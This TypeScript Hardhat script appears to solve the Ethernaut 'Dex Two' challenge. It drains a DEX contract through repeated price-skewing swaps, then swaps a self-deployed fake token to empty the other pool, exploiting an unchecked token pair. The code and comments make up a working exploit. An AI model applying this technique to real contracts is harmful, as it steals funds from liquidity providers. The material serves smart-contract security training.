import { ethers } from "hardhat";
import { BigNumber, Contract } from "ethers";
import { abi } from "../../artifacts/contracts/23.Dex2/DexTwo.sol/DexTwo.json";
import { abi as SwappableTokenAbi } from "../../artifacts/contracts/22.Dex/Dex.sol/SwappableToken.json";
import { displayResult } from "../../utils/displayResult";
import { deployContract } from "../../utils/deployContract";

const targetAddress = "0xa553fb05995E282e3efcc8fB35b9d8957eEd445c";

async function main() {
  const [attacker] = await ethers.getSigners();
  const target = new Contract(targetAddress, abi, attacker);

  await target.approve(target.address, ethers.constants.MaxUint256);
  const token1 = new Contract(
    await target.token1(),
    SwappableTokenAbi,
    attacker
  );
  const token2 = new Contract(
    await target.token2(),
    SwappableTokenAbi,
    attacker
  );
  let token1Balance = (await token1.balanceOf(attacker.address)) as BigNumber;
  let token2Balance = (await token2.balanceOf(attacker.address)) as BigNumber;
  let alternate = false;

  while (!token1Balance.eq(110) && !token2Balance.eq(110)) {
    let from = token1;
    let to = token2;
    if (alternate) {
      from = token2;
      to = token1;
    }
    alternate = !alternate;
    let amount = (await from.balanceOf(attacker.address)) as BigNumber;
    const price = await target.getSwapAmount(from.address, to.address, amount);
    amount = price.lt(110) ? amount : BigNumber.from(45);

    const tx = await target.swap(from.address, to.address, amount);
    await tx.wait();
    token1Balance = (await token1.balanceOf(attacker.address)) as BigNumber;
    token2Balance = (await token2.balanceOf(attacker.address)) as BigNumber;
  }

  const myToken = await deployContract("MyToken", attacker, [
    target.address,
    "MyToken",
    "MT",
    2,
  ]);

  const tx = await target.swap(myToken.address, token2.address, 1);
  await tx.wait();
  token2Balance = (await token2.balanceOf(attacker.address)) as BigNumber;

  displayResult(token1Balance.eq(110) && token2Balance.eq(110));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/*  Explanation of the code:

  Let's first do the same thing as in Dex. 
  ---------------------------------------
  To take all of the money inside the pool, we jsut have to do consecutive swaps
  Each time, it will desequilibrate the pool and we will be able to take more money.
  We will swap the maximun every time, execpt for the last swap.
  We will use the getPrice function to get the get swap price of the swap.
   function getSwapPrice(
        address from,
        address to,
        uint amount
    ) public view returns (uint) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }
  tokenX I have, tokenX in the pool  -  tokenY I have, tokenY in the pool :
            10, 100                  -             10, 100
             0, 110                  ->            20, 90
            24, 86                  <-              0, 110
             0, 110                  ->            30, 80
            41, 69                  <-              0, 110
             0, 110                  ->            65, 45
  If for next step we swap the maximun we will get a price > 110, which will revert.
  So we must solve this equation:
  a * tPool / fPool = 110 | a begin the amount to swap, tPool the amount of the "to" Token inside the pool
                            fPool the amount of the "from" Token inside the pool 
  
  a * 110 / 45 = 110                          
  a * 110 = 45 * 110
  a = 45

  Last swap:
            110, 0                  <-        20, 90  
 
  Now we have all the tokenX.
  ---------------------------
  Now we can do the rest:
  The swap function does not check if we are swaping token1 with token2.
  So we can swap token2 with a token that we control.
  If we make sure that the following equation is true, we will be able to take all the token2:
      amount * token2PoolBalance / token1PoolBalance = token2PoolBalance
 <==> amount * 90 = token1PoolBalance * 90
 <==> amount = token1PoolBalance and token1PoolBalance != 0
 So we just have to create a token where token1PoolBalance = 1 and swap 1 of it.

  */
